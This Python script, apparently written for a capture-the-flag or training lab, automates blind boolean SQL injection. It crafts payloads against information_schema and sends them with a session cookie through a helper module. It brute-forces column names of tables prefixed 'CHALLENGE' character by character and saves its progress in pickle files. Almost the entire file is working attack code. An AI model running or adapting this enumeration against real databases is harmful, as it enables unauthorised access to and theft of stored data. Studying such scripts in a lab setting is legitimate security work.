import pickle
import string
import tabulate

from helpers import inject


def print_columns():
    data = pickle.load(open('outputs/columns.pkl', 'rb'))
    row = []
    for entry in data:
        for table_name, columns in entry.items():
            row.append([table_name, ','.join(columns)])

    print(tabulate.tabulate(row, headers=["Table Name", "Column Names"]))


def check_query(table_name, column_name):
    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
           f'and column_name= \'{column_name}\')--'


def builder_query(table_name, length, word):
    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
           f'and substring(column_name,1,{length})=\'{word}\')--'


def get_column_names(cookie):
    tables = []
    columns = []
    all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))
    no_of_queries = 0

    for i in all_tables:
        if i.startswith('CHALLENGE'):
            tables.append(i)

    alphabets = string.ascii_letters + '_'

    for table_name in tables:
        all_columns = []
        column_dict = {table_name: []}
        queue = ['']
        program_state_columns = []

        while queue:
            queue_word = queue.pop(0)
            for a in alphabets:
                word = queue_word + a
                query = builder_query(table_name=table_name, length=len(word), word=word)
                no_of_queries += 1
                if inject.inject(cookie=cookie, query=query):
                    print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                    all_columns.append(word)
                    queue.append(word)

            program_state_columns.append([queue, all_columns])
            pickle.dump(program_state_columns, open('states/program_state_column.pkl', 'wb'))

        for name in all_columns:
            query = check_query(table_name=table_name, column_name=name)
            no_of_queries += 1
            if inject.check(cookie, query):
                print(f'Found Column: {name}')
                column_dict[table_name].append(name)
        columns.append(column_dict)

        print(columns)
        pickle.dump(columns, open('outputs/columns.pkl', 'wb'))
    print(f'No of queries: {no_of_queries}')